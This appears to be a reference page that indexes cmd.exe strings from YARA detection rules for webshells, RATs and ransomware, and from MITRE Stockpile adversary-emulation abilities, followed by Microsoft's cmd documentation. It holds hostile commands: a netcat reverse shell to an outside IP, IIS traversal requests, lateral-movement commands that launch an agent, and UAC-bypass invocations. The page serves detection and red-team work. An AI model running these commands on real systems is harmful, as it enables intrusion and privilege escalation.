[signature-base](https://github.com/Neo23x0/signature-base) | [crime_cn_campaign_njrat.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/crime_cn_campaign_njrat.yar) | $x1 = "cmd.exe /c ping 0 -n 2 & del \"" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [crime_cn_campaign_njrat.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/crime_cn_campaign_njrat.yar) | $a1 = "taskkill /f /im cmd.exe" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [crime_fireball.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/crime_fireball.yar) | $s1 = "cmd.exe /c MD " fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [crime_fireball.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/crime_fireball.yar) | $s1 = "C:\\Windows\\System32\\cmd.exe /c \"\"" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [crime_nansh0u.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/crime_nansh0u.yar) | $s1 = "taskkill /im cmd.exe /f" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [crime_ransom_robinhood.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/crime_ransom_robinhood.yar) | $s3 = "cmd.exe /c net use * /DELETE /Y" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [crime_wannacry.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/crime_wannacry.yar) | $s3 = "cmd.exe /c \"%s\"" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [exploit_cve_2014_4076.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/exploit_cve_2014_4076.yar) | $x1 = "[+] Created a new cmd.exe process" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [exploit_cve_2017_8759.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/exploit_cve_2017_8759.yar) | $x1 = "Error = Process.Create(\"powershell -nop cmd.exe /c" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [exploit_uac_elevators.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/exploit_uac_elevators.yar) | $s1 = "\\cmd.exe" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [exploit_uac_elevators.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/exploit_uac_elevators.yar) | $s1 = "%systemroot%\\system32\\cmd.exe" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [exploit_uac_elevators.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/exploit_uac_elevators.yar) | description = "Detects s4u executable which allows the creation of a cmd.exe with the context of any user without requiring the password. - file s4u.exe" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [exploit_uac_elevators.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/exploit_uac_elevators.yar) | $g1 = "%systemroot%\\system32\\cmd.exe" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_cn_hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cn_hacktools.yar) | $s1 = "Usage : ms11-080.exe cmd.exe Command " fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_cn_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cn_webshells.yar) | $s4 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_cn_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cn_webshells.yar) | $s5 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_cn_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cn_webshells.yar) | $s1 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_cn_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cn_webshells.yar) | $s1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_cn_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cn_webshells.yar) | $s3 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_cn_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cn_webshells.yar) | $s4 = "cmd = \"cmd.exe /c set\";" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_cn_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cn_webshells.yar) | $s1 = "cmd=chr(34)&\"cmd.exe /c \"&request.form(\"cmd\")&\" > 8617.tmp\"&chr(34)" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_cn_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cn_webshells.yar) | $s0 = "Dim myProcessStartInfo As New ProcessStartInfo(\"cmd.exe\")" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_crimson_rat.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_crimson_rat.yar) | $x3 = "cmd.exe/c systeminfo >> 1.txt" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_fireeye_redteam_tools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_fireeye_redteam_tools.yar) | $s5 = /self\.__shell[\x09\x20]{0,32}=[\x09\x20]{0,32}[\x22\x27]cmd.exe[\x09\x20]{1,32}\/q[\x09\x20]{1,32}\/K [\x22\x27]/ nocase | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_khepri.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_khepri.yar) | $sa2 = "cmd.exe /c " | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_malware_set_qa.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_malware_set_qa.yar) | $s1 = "cmd.exe /c ping 0 -n 2 & del \"" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_mal_link.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_mal_link.yar) | $c1 = "C:\\Windows\\System32\\cmd.exe" ascii wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_mal_link.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_mal_link.yar) | $s1 = "cmd.exe /" ascii wide nocase | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_p0wnshell.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_p0wnshell.yar) | $x5 = "FileName = \"cmd.exe\"," fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_p0wnshell.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_p0wnshell.yar) | $x3 = "-CreateProcess \"cmd.exe\" -Username \"nt authority\\system\"" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_rats_malwareconfig.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_rats_malwareconfig.yar) | $s7 = "cmd.exe /c rundll32 \"%s\"" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_rats_malwareconfig.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_rats_malwareconfig.yar) | $v1 = "cmd.exe /k ping 0 & del" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_rats_malwareconfig.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_rats_malwareconfig.yar) | $v2 = "cmd.exe /c ping 127.0.0.1 & del" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_rats_malwareconfig.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_rats_malwareconfig.yar) | $v3 = "cmd.exe /c ping 0 -n 2 & del" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_redmimicry.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_redmimicry.yar) | $cmd0 = "C:\\Windows\\System32\\cmd.exe" ascii fullword | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_rottenpotato.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_rottenpotato.yar) | $s1 = "\"C:\\Windows\\System32\\cmd.exe\" /K start" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_sharpcat.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_sharpcat.yar) | $s2 = "C:\\Windows\\System32\\cmd.exe" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_suspicious_strings.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_suspicious_strings.yar) | $s3 = "cmd.exe /C script:http://" ascii nocase | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_suspicious_strings.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_suspicious_strings.yar) | $s4 = "cmd.exe /C script:https://" ascii nocase | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_susp_lnk_files.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_susp_lnk_files.yar) | $command = "C:\\Windows\\System32\\cmd.exe" fullword ascii //cmd is precursor to findstr | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_susp_obfuscation.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_susp_obfuscation.yar) | reference = "https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_webshells.yar) | $gen_bit_sus11 = "\"cmd.exe" nocase | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_webshells.yar) | // execute cmd.exe /c with arguments using ProcessStartInfo | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_webshells.yar) | $susasp4  = "cmd.exe" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_webshells.yar) | $asp_gen_sus11 = "\"cmd.exe" nocase | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_webshells.yar) | $sus2 = "cmd.exe" fullword wide ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_webshells.yar) | $exec_shell1 = "cmd.exe" nocase wide ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_webshells.yar) | $sus5 = "cmd.exe" fullword wide ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_webshells.yar) | $fp1 = "command = \"cmd.exe /c set\";" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_winshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_winshells.yar) | $s1 = "cmd                  - execute cmd.exe" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_winshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_winshells.yar) | $s1 = "[ executing cmd.exe" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [mal_ransom_lorenz.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/mal_ransom_lorenz.yar) | $x1 = "process call create \"cmd.exe /c schtasks /Create /F /RU System /SC ONLOGON " ascii fullword | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [mal_ransom_lorenz.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/mal_ransom_lorenz.yar) | $s1 = "process call create \"cmd.exe /c schtasks /Create /F " ascii fullword | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [spy_regin_fiveeyes.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/spy_regin_fiveeyes.yar) | $a6="cmd.exe" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar) | $s4 = "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar) | description = "ReactOS cmd.exe with correct file name - maybe packed with software or part of hacker toolset" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar) | $s8 = "a.WriteLine (\"cmd.exe\")" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar) | $s1 = "cmd.exe" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar) | $s8 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar) | $s9 = "/scripts/..%c1%1c../winnt/system32/cmd.exe" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar) | $s1 = "\\cmd.exe\" /k wusa c:\\users\\" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar) | $x6 = "Trying to map C:\\windows\\system32\\cmd.exe into current process" fullword wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | $s3 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | $s9 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | $s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParam" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | $s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | $s7 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | $s7 = "Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\winnt\\system32\\cmd.exe /c type c:" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | $s0 = "Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)" fullword | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | $s3 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | $s0 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | $s1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | $s14 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | $s6 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | $s1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | $s1 = ".StartInfo.FileName = 'cmd.exe';" ascii fullword | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[stockpile](https://github.com/mitre/stockpile) | [55678719-e76e-4df9-92aa-10655bbd1cf4.yml](https://github.com/mitre/stockpile/blob/master/data/abilities/collection/55678719-e76e-4df9-92aa-10655bbd1cf4.yml) | `name: cmd.exe information gathering`{:.highlight .language-yaml} | [Apache-2.0](https://github.com/mitre/stockpile/blob/master/LICENSE)
[stockpile](https://github.com/mitre/stockpile) | [55678719-e76e-4df9-92aa-10655bbd1cf4.yml](https://github.com/mitre/stockpile/blob/master/data/abilities/collection/55678719-e76e-4df9-92aa-10655bbd1cf4.yml) | `cmd.exe /c "net user" >> C:\Windows\temp\history.log;`{:.highlight .language-yaml} | [Apache-2.0](https://github.com/mitre/stockpile/blob/master/LICENSE)
[stockpile](https://github.com/mitre/stockpile) | [55678719-e76e-4df9-92aa-10655bbd1cf4.yml](https://github.com/mitre/stockpile/blob/master/data/abilities/collection/55678719-e76e-4df9-92aa-10655bbd1cf4.yml) | `cmd.exe /c "whoami /priv" >> C:\Windows\temp\history.log;`{:.highlight .language-yaml} | [Apache-2.0](https://github.com/mitre/stockpile/blob/master/LICENSE)
[stockpile](https://github.com/mitre/stockpile) | [55678719-e76e-4df9-92aa-10655bbd1cf4.yml](https://github.com/mitre/stockpile/blob/master/data/abilities/collection/55678719-e76e-4df9-92aa-10655bbd1cf4.yml) | `cmd.exe /c "netstat -ano" >> C:\Windows\temp\history.log;`{:.highlight .language-yaml} | [Apache-2.0](https://github.com/mitre/stockpile/blob/master/LICENSE)
[stockpile](https://github.com/mitre/stockpile) | [5f844ac9-5f24-4196-a70d-17f0bd44a934.yml](https://github.com/mitre/stockpile/blob/master/data/abilities/defense-evasion/5f844ac9-5f24-4196-a70d-17f0bd44a934.yml) | `Commandline = 'cmd.exe /c "timeout /nobreak /t 10 >nul 2>nul & del /f #{location}"';`{:.highlight .language-yaml} | [Apache-2.0](https://github.com/mitre/stockpile/blob/master/LICENSE)
[stockpile](https://github.com/mitre/stockpile) | [ece5dde3-d370-4c20-b213-a1f424aa8d03.yml](https://github.com/mitre/stockpile/blob/master/data/abilities/execution/ece5dde3-d370-4c20-b213-a1f424aa8d03.yml) | `wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "cmd.exe C:\Users\Public\s4ndc4t.exe -server #{server} -group #{group}";`{:.highlight .language-yaml} | [Apache-2.0](https://github.com/mitre/stockpile/blob/master/LICENSE)
[stockpile](https://github.com/mitre/stockpile) | [41bb2b7a-75af-49fd-bd15-6c827df25921.yml](https://github.com/mitre/stockpile/blob/master/data/abilities/lateral-movement/41bb2b7a-75af-49fd-bd15-6c827df25921.yml) | `Invoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\Users\Public\svchost.exe -server #{server} } };`{:.highlight .language-yaml} | [Apache-2.0](https://github.com/mitre/stockpile/blob/master/LICENSE)
[stockpile](https://github.com/mitre/stockpile) | [95ad5d69-563e-477b-802b-4855bfb3be09.yml](https://github.com/mitre/stockpile/blob/master/data/abilities/privilege-escalation/95ad5d69-563e-477b-802b-4855bfb3be09.yml) | `.\Akagi64.exe 30 C:\Windows\System32\cmd.exe`{:.highlight .language-yaml} | [Apache-2.0](https://github.com/mitre/stockpile/blob/master/LICENSE)
[stockpile](https://github.com/mitre/stockpile) | [b7344901-0b02-4ead-baf6-e3f629ed545f.yml](https://github.com/mitre/stockpile/blob/master/data/abilities/privilege-escalation/b7344901-0b02-4ead-baf6-e3f629ed545f.yml) | `.\Akagi64.exe 45 C:\Windows\System32\cmd.exe`{:.highlight .language-yaml} | [Apache-2.0](https://github.com/mitre/stockpile/blob/master/LICENSE)

## Additional Info*

**The information below is copied from [MicrosoftDocs](https://github.com/MicrosoftDocs/windowsserverdocs), which is maintained by [Microsoft](https://opensource.microsoft.com/codeofconduct/). Available under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) license.*

---

## cmd

Starts a new instance of the command interpreter, Cmd.exe. If used without parameters, **cmd** displays the version and copyright information of the operating system.

### Syntax

```
cmd [/c|/k] [/s] [/q] [/d] [/a|/u] [/t:{<b><f> | <f>}] [/e:{on | off}] [/f:{on | off}] [/v:{on | off}] [<string>]
```

#### Parameters

| Parameter | Description |
| --------- | ----------- |
| /c | Carries out the command specified by *string* and then stops. |
| /k | Carries out the command specified by *string* and continues. |
| /s | Modifies the treatment of *string* after **/c** or **/k**. |
| /q | Turns the echo off. |
| /d | Disables execution of AutoRun commands. |
| /a | Formats internal command output to a pipe or a file as American National Standards Institute (ANSI). |
| /u | Formats internal command output to a pipe or a file as Unicode. |
| /t:{`<b><f>` \| `<f>`} | Sets the background (*b*) and foreground (*f*) colors. |
| /e:on | Enables command extensions. |
| /e:off | Disables commands extensions. |
| /f:on | Enables file and directory name completion. |
| /f:off | Disables file and directory name completion. |
| /v:on | Enables delayed environment variable expansion. |
| /v:off | Disables delayed environment variable expansion. |
| `<string>` | Specifies the command you want to carry out. |
| /? | Displays help at the command prompt. |

The following table lists valid hexadecimal digits that you can use as the values for `<b>` and `<f>`:

| Value | Color |
| ----- | ----- |
| 0 | Black |
| 1 | Blue |
| 2 | Green |
| 3 | Aqua |
| 4 | Red |
| 5 | Purple |
| 6 | Yellow |
| 7 | White |
| 8 | Gray |
| 9 | Light blue |
| a | Light green |
| b | Light aqua |
| c | Light red |
| d | Light purple |
| e | Light yellow |
| f | Bright white |

### Remarks

- To use multiple commands for `<string>`, separate them by the command separator **&&** and enclose them in quotation marks. For example:

    ```
    "<command1>&&<command2>&&<command3>"
    ```

- If you specify **/c** or **/k**, **cmd** processes, the remainder of *string*, and the quotation marks are preserved only if all of the following conditions are met:

    - You don't also use **/s**.

    - You use exactly one set of quotation marks.

    - You don't use any special characters within the quotation marks (for example: & < > ( ) @ ^ | ).

    - You use one or more white-space characters within the quotation marks.

    - The *string* within quotation marks is the name of an executable file.

